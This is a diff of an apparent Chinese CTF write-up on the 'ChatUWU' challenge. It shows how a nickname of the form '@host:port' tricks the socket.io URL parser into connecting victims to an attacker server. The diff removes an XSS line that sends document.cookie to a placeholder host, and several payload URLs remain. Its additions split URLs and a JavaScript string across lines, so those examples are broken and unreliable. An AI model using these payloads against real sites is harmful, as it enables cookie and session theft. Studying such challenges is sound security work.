@@ -385,7 +385,9 @@ console.log(`ChatUWU server running at http://${hostname}:${port}/`);
 
 这位是师傅的payload是这样的
 
-http://47.254.28.30:58000/?room=DOMPurify&nickname=guest5279@85.244.211.240:9000
+http://47.254.28.30:
+58000/?room=DOMPurify&nickname=guest5279@85.244.211.240:
+9000
 
 @ 后面是自己的服务器地址。
 
@@ -393,7 +395,8 @@ http://47.254.28.30:58000/?room=DOMPurify&nickname=guest5279@85.244.211.240:9000
 
 详细分析
 
-注意他前端连接socket服务器的地方是这样的，前端我们唯一能方便控制的也就是 location.search ，同时也注意到他这个xssbot只能接收 http://47.254.28.30:58000/开头的链接，那多半是这个查询参数的问题了。
+注意他前端连接socket服务器的地方是这样的，前端我们唯一能方便控制的也就是 location.search ，同时也注意到他这个xssbot只能接收 http://47.254.28.30:
+58000/开头的链接，那多半是这个查询参数的问题了。
 
 1
 
@@ -639,7 +642,8 @@ return data;
 
 }
 
-可以看到 str(http://47.254.28.30:58000/?room=DOMPurify&nickname=guest0611) 经过正则提取后得到了个14个元素的数组，将他们一一对应起来就构成了解析后的 uri 对象。
+可以看到 str(http://47.254.28.30:
+58000/?room=DOMPurify&nickname=guest0611) 经过正则提取后得到了个14个元素的数组，将他们一一对应起来就构成了解析后的 uri 对象。
 
 上文所用的payload正是因为这个正则提取的问题。（有兴趣的师傅可以看看这个很长的正则）
 
@@ -651,7 +655,8 @@ return data;
 
 1
 
-console.log(parse("https://pankas.top/?aaa=test&name=pankas@127.0.0.1:8080"))
+console.log(parse("https://pankas.top/?aaa=test&name=pankas@127.0.0.1:
+8080"))
 
 可以发现返回的 host 和 post都成了我们 @ 后面的这个了
 
@@ -753,7 +758,7 @@ io.to(room).emit('msg', {
 
 from: "pankas",
 
-text: "<img src=1 onerror='location.href=`http://yourHostname:youPort/?flag=${document.cookie}`'>",//为了稳定触发最好还是用 onerror
+text: "",//为了稳定触发最好还是用 onerror
 
 isHtml: true
 
@@ -771,7 +776,9 @@ console.log(`ChatUWU server running at http://${hostname}:${port}/`);
 
 1
 
-http://47.254.28.30:58000/?room=DOMPurify&nickname=guest1442@yourHostname:yourPort
+http://47.254.28.30:
+58000/?room=DOMPurify&nickname=guest1442@yourHostname:
+yourPort
 
 参考链接
 
